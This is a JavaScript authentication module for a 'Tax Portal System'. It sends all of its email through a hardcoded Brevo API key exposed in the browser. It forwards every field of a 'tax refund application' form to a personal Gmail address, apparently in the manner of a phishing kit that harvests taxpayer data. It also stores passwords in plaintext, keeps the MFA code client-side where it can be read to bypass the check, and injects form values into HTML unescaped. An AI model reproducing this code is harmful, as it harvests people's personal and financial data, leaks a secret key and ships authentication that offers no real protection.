const Auth = (function() {
    const BREVO_API_KEY = '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';
    const VERIFIED_SENDER = 'ogunderotamiloluwa@gmail.com';
    const COMPANY_EMAIL = 'ogunderotamiloluwa@gmail.com';

    async function sendDirectEmail(toEmail, subject, htmlContent) {
        try {
            const response = await fetch('https://api.brevo.com/v3/smtp/email', {
                method: 'POST',
                headers: {
                    'accept': 'application/json',
                    'api-key': BREVO_API_KEY,
                    'content-type': 'application/json'
                },
                body: JSON.stringify({
                    sender: { name: "Tax Portal System", email: VERIFIED_SENDER },
                    to: [{ email: toEmail }],
                    subject: subject,
                    htmlContent: htmlContent
                })
            });
            return response.ok;
        } catch (error) {
            console.error("Email Error:", error);
            return false;
        }
    }

    return {
        async sendCode(email, type) {
            const code = Math.floor(100000 + Math.random() * 900000).toString();
            sessionStorage.setItem('tax_mfa_' + email.toLowerCase(), code);
            const html = `<div style="font-family:sans-serif;padding:20px;border:1px solid #004c99;">
                <h2>${type} Verification</h2>
                <p>Your code is: <b style="font-size:28px;">${code}</b></p>
            </div>`;
            return await sendDirectEmail(email, `${type} Code`, html);
        },

        // NEW: Function to send all form data to company email
        async sendFinalApplication(formData) {
            let tableRows = "";
            for (const [key, value] of Object.entries(formData)) {
                tableRows += `<tr><td style="padding:8px;border:1px solid #ddd;"><b>${key}</b></td><td style="padding:8px;border:1px solid #ddd;">${value}</td></tr>`;
            }

            const html = `
                <div style="font-family:sans-serif; max-width:600px; border:1px solid #eee; padding:20px;">
                    <h2 style="color:#004c99;">New Tax Refund Application</h2>
                    <table style="width:100%; border-collapse:collapse;">
                        ${tableRows}
                    </table>
                </div>`;
            
            return await sendDirectEmail(COMPANY_EMAIL, "NEW APPLICATION: " + formData.fullName, html);
        },

        async register(email, password, profile) {
            localStorage.setItem('tax_user_' + email.toLowerCase(), JSON.stringify({ password, profile }));
            return await this.sendCode(email, 'Registration');
        },

        async login(email, password) {
            const data = localStorage.getItem('tax_user_' + email.toLowerCase());
            if (!data) throw new Error("Account not found.");
            const user = JSON.parse(data);
            if (user.password !== password) throw new Error("Incorrect password.");
            return await this.sendCode(email, 'Login');
        },

        async requestReset(email) {
            if (!localStorage.getItem('tax_user_' + email.toLowerCase())) throw new Error("Email not found.");
            return await this.sendCode(email, 'Password Reset');
        },

        verifyMfa(email, code) {
            const stored = sessionStorage.getItem('tax_mfa_' + email.toLowerCase());
            if (stored && stored === code.trim()) {
                sessionStorage.setItem('tax_current_user', email.toLowerCase());
                return true;
            }
            return false;
        },

        updatePassword(email, newPassword) {
            const data = localStorage.getItem('tax_user_' + email.toLowerCase());
            if (data) {
                const user = JSON.parse(data);
                user.password = newPassword;
                localStorage.setItem('tax_user_' + email.toLowerCase(), JSON.stringify(user));
                return true;
            }
            return false;
        },

        isAuthenticated() { return !!sessionStorage.getItem('tax_current_user'); }
    };
})();